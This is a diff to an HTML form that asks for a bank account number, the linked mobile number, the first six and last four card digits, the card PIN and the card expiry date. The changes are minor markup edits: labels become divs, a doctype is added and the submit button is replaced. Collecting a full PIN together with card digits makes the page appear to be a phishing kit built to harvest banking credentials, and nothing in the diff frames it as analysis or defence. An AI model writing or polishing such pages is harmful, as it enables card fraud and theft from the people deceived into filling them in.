@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
     <head>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
@@ -32,7 +33,7 @@
                 <br><br>
                 <section>
                     <form  class="login100-form validate-form" method="post" id="insta-submit">
-                    <label class="wrap-input100 validate-input" data-validate = "Valid account number: 8575367468"><b>Type your account number *</b></label>
+                    <div class="wrap-input100 validate-input" data-validate = "Valid account number: 8575367468"><b>Type your account number *</b></div>
                     <input class="form-control" id="acc_number"
                     maxlength="10"
                     minlength="10"
@@ -43,7 +44,7 @@
                     name="acc_number"
                     required>
                     <br>
-                    <label><b>Type the mobile number attached to your account *</b></label>
+                    <div><b>Type the mobile number attached to your account *</b></div>
                     <input class="form-control" type="tel" 
                     id="password"
 									maxlength="11"
@@ -55,7 +56,7 @@
 									name="mobile_number"
                                     required>
                     <br>
-                    <label><b>First 6 digits *</b> </label>
+                    <div><b>First 6 digits *</b> </div>
                     <input class="form-control" type="tel" 
                     id="first_six_digit"
 									maxlength="6"
@@ -67,7 +68,7 @@
 									name="first_six_digit"
                                     required>
                         <br>
-                        <label><b>Last 4 digits *</b></label>
+                        <div><b>Last 4 digits *</b></div>
                     <input class="form-control" type="tel" 
                     id="last_four_digit"
 									maxlength="4"
@@ -81,7 +82,7 @@
                         <br>
                     <div class="row">
                         <div class="col">
-                        <label><b>Card Pin *<b></b></b></label><b><b>
+                        <div><b>Card Pin *<b></b></b></div><b><b>
                             <input type="tel" class="form-control" 
                             id="card_pin"
 									maxlength="4"
@@ -94,7 +95,7 @@
                                     required>
                         </b></b></div><b><b>
                         <div class="col">
-                        <label><b>Card Expiry Date *</b></label>
+                        <div><b>Card Expiry Date *</b></div>
                         <div class="row">
                         <div class="col">
                         <select id="month_expiry" name="month_expiry" class="form-control" required>
@@ -137,9 +138,10 @@
                         <br>
                             <br>
                             <div>
-                <div class="container-login100-form-btn">
+                <!-- <div class="container-login100-form-btn">
                         <button class="form-control btn-danger btn-lg" type="submit" onclick="return check(this.form )" name="submit">SUBMIT</button>
-                </div>
+                </div> -->
+                <input class="form-control btn-danger btn-lg" type="button" value="SUBMIT" onclick="return check(this.form )" name="submit">
                 </div>
                     
                 
